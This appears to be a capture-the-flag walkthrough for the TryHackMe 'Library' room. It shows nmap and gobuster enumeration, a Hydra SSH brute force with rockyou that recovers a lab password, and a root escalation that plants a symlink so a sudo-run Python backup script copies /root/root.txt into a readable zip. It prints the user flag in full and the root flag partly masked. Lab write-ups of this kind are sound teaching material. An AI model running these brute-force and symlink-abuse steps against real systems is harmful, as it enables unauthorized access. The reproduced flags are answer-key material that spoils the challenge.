
# Library

Room: https://tryhackme.com/room/bsidesgtlibrary

Library is a boot2root machine created for FIT and BSides Guatemala CTF. The goal is to enumerate exposed services, gain an initial shell, then escalate privileges to root.


⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/bsidesgtlibrary.md


---

## Enumeration

### Nmap

We started with a full TCP port scan, using SYN scan, version detection, OS detection, and faster timing.

### Command

```bash
nmap -p- -sS -T4 -sV -O 10.48.180.239
```

### Output

```text
sudo: unable to resolve host ip-10-48-70-61: Name or service not known
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-27 10:19 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.48.180.239
Host is up (0.00052s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```

The scan shows two open ports:

```text
22/tcp SSH
80/tcp HTTP
```

SSH is useful once we have credentials. HTTP is usually the best first place to enumerate because it may leak usernames, wordlists, hidden paths, or application clues.

---

## Web Enumeration

### gobuster

### Command

```gobuster
gobuster dir -u http://10.48.180.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,sql,env,config,xml,json -t 40
```

### Output

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.180.239
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,bak,config,xml,php,sql,env,json,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

[2K/.html                (Status: 403) [Size: 293]

[2K/images               (Status: 301) [Size: 315] [--> http://10.48.180.239/images/]

[2K/index.html           (Status: 200) [Size: 5439]

[2K/robots.txt           (Status: 200) [Size: 33]

[2K/server-status        (Status: 403) [Size: 301]

===============================================================
Finished
===============================================================
[2KProgress: 2182750 / 2182760 (100.00%)
```

### Robots.txt

gobuster found `robots.txt`.

### Command

```bash
curl -X GET -L -s --max-time 30 http://10.48.180.239/robots.txt
```

### Output

```text
sudo: unable to resolve host ip-10-48-70-61: Name or service not known
User-agent: rockyou 
Disallow: /
```

The interesting part here is:

```text
User-agent: rockyou
```

This strongly hints that the `rockyou.txt` wordlist should be used somewhere. Since SSH is open, the next likely step is password spraying or brute forcing a discovered or guessed username.

In this room, the username is:

```text
meliodas
```

---

## Initial Access

### Hydra SSH Brute Force

We used Hydra against SSH with the username `meliodas` and the `rockyou.txt` password list.

### Command

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -s 22 -t 4 -f ssh://10.48.180.239
```

### Output

```text
sudo: unable to resolve host ip-10-48-70-61: Name or service not known
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-27 10:38:10
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.48.180.239:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344354 to do in 5433:29h, 4 active
[STATUS] 33.33 tries/min, 100 tries in 00:03h, 14344298 to do in 7172:09h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344194 to do in 8203:23h, 4 active
[22][ssh] host: 10.48.180.239   login: meliodas   password: iloveyou1
[STATUS] attack finished for 10.48.180.239 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-27 10:46:10
```

Hydra found valid SSH credentials:

```text
Username: meliodas
Password: iloveyou1
```

---

## SSH Login

### Command

```bash
ssh meliodas@10.48.180.239
```

After logging in, we read the user flag.

### Command

```bash
cat user.txt
```

### Output

```text
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec
```

User flag:

```text
6d488cbb3f111d135722c33cb635f4ec
```

---

## Privilege Escalation Enumeration

Once we had a shell as `meliodas`, the first check was sudo permissions.

### Command

```bash
sudo -l
```

### Output

```text
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$ ls
```

This is the privilege escalation path.

The user `meliodas` can run the following as root without a password:

```text
/usr/bin/python* /home/meliodas/bak.py
```

That means we cannot simply run any command as root, but we can run this specific Python script as root.

Next, we inspect the script.

---

## Inspecting bak.py

### Command

```bash
cat bak.py
```

### Output

```text
meliodas@ubuntu:~$ cat bak.py #!/usr/bin/env python import os import zipfile def zipdir(path, ziph): for root, dirs, files in os.walk(path): for file in files: ziph.write(os.path.join(root, file)) if __name__ == '__main__': zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED) zipdir('/var/www/html', zipf) zipf.close()
```

Formatted for readability, the script does this:

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The script creates a zip archive at:

```text
/var/backups/website.zip
```

It backs up everything under:

```text
/var/www/html
```

Since we can run this script as root, any file that the script reads will be read with root permissions.

The important line is:

```python
ziph.write(os.path.join(root, file))
```

If we can place a symbolic link inside the backed up web directory, and that symbolic link points to a root-only file, the script may follow the link and include the target file contents inside the zip.

So the plan is:

1. Find a writable location inside `/var/www/html`
2. Create a symlink to `/root/root.txt`
3. Run the backup script as root using sudo
4. Extract the symlinked file content from `/var/backups/website.zip`

---

## Checking Web Directory Permissions

### Command

```bash
ls -la /var/www/html
```

### Output

```text
meliodas@ubuntu:/var/www/html$ ls -la
total 24
drwxr-xr-x 3 root     root      4096 Aug 24  2019 .
drwxr-xr-x 3 root     root      4096 Aug 24  2019 ..
drwxrwxr-x 3 meliodas meliodas  4096 Apr 27 03:08 Blog
-rw-r--r-- 1 root     root     11321 Aug 24  2019 index.html
```

The `/var/www/html` directory itself is owned by root, but the `Blog` directory is owned by `meliodas`.

```text
drwxrwxr-x 3 meliodas meliodas 4096 Apr 27 03:08 Blog
```

This means we can write files inside:

```text
/var/www/html/Blog
```

That gives us control over content that the root-run backup script will include.

---

## Creating a Symlink to the Root Flag

We create a symbolic link inside the writable `Blog` directory. The symlink points to `/root/root.txt`.

### Command

```bash
ln -s /root/root.txt /var/www/html/Blog/root_link
```

This creates:

```text
/var/www/html/Blog/root_link
```

pointing to:

```text
/root/root.txt
```

As the normal user, we cannot directly read `/root/root.txt`. However, the backup script will run as root and attempt to add files from `/var/www/html` into the zip archive.

---

## Running the Backup Script as Root

Because sudo allows us to run the script with Python as root, we execute it using the exact allowed path.

### Command

```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```

This creates or overwrites:

```text
/var/backups/website.zip
```

Because the script was run as root, it can read `/root/root.txt` through the symlink.

---

## Reading the Root Flag from the Backup

Now we use `unzip -p` to print the contents of the `root_link` entry inside the zip archive.

### Command

```bash
unzip -p /var/backups/website.zip var/www/html/Blog/root_link
```

### Output

```text
meliodas@ubuntu:/$ unzip -p /var/backups/website.zip var/www/html/Blog/root_link
e8c8c6xxxxxxxxxxxxxx4ee0488c617
```

Root flag:

```text
e8c8c6xxxxxxxxxxxxxxxee0488c617
```

---

## Why This Works

The sudo rule allows `meliodas` to execute the backup script as root:

```text
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

The script backs up `/var/www/html` into `/var/backups/website.zip`.

The `Blog` directory inside `/var/www/html` is writable by `meliodas`, so we can place a symlink there.

The symlink points to a root-only file:

```text
/root/root.txt
```

When the backup script runs as root, it follows the symlink and stores the contents of the target file in the zip archive. We then read that content from the zip as the normal user.

This is a symlink abuse issue in a privileged backup script.

---

---

## Summary

The path for this box was:

```text
Nmap found SSH and HTTP
robots.txt hinted at rockyou
Hydra found SSH credentials for meliodas
SSH access gave the user flag
sudo -l revealed a root-runnable Python backup script
the script zipped /var/www/html
/var/www/html/Blog was writable by meliodas
a symlink to /root/root.txt was placed inside Blog
the backup script was run as root
the root flag was recovered from the generated zip archive
```

